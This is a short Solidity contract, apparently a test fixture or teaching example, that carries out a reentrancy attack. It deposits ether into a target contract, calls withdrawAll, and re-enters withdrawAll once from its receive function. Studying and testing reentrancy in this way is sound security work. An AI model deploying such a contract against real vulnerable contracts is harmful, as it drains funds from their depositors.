contract ReenterAttacker {
    C public target;
    uint256 public reentryCount;
    bool public inAttack;

    constructor(C _target) {
        target = _target;
    }

    function attack() external payable {
        require(!inAttack, "already attacking");
        inAttack = true;
        target.deposit{value: msg.value}();
        reentryCount = 0;
        target.withdrawAll();
        inAttack = false;
    }

    receive() external payable {
        if (reentryCount < 1) {
            reentryCount++;
            target.withdrawAll();
        }
    }
}

